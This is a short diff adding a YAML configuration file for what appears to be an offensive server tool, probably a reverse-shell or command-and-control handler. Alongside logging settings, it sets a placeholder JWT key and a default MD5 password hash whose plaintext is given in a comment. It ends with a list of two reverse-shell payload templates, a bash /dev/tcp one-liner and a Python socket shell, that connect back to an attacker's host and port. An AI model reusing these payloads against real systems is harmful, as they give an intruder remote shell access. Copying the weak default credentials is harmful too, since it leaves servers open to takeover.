@@ -1,0 +1,25 @@
+# Server Global Configuration
+# system configuration
+system:
+    env: 'public'
+    addr: 8668
+
+# jwt configuration
+auth:
+    jwtkey: 'modifyityourself'
+    password-hash: '74819dbcab8fbc951a670cd7e72c82e8' #md5 hash default: eki@sh
+
+# logger configuration
+log:
+    prefix: '[Server]'
+    log-file: true
+    stdout: 'DEBUG'
+    file: 'DEBUG'
+
+reverse-shell-payloads:
+    - 
+        command: 'bash'
+        payload: '/bin/bash -i >& /dev/tcp/{{.LHost}}/{{.LPort}} 0>&1'
+    -
+        command: 'python'
+        payload: 'python -c ''import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("{{.LHost}}",{{.LPort}})); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'''
